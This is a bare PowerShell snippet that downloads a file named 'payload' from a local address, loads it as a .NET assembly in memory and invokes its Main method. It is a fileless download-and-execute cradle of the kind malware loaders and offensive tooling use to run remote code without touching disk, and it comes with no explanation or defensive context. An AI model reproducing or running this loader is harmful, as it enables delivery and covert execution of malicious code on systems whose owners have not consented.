$data = (New-Object System.Net.WebClient).DownloadData('http://127.0.0.1/payload') 
$assem = [System.Reflection.Assembly]::Load($data) 
$entryPointMethod = $assem.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('foo', 'bar')))
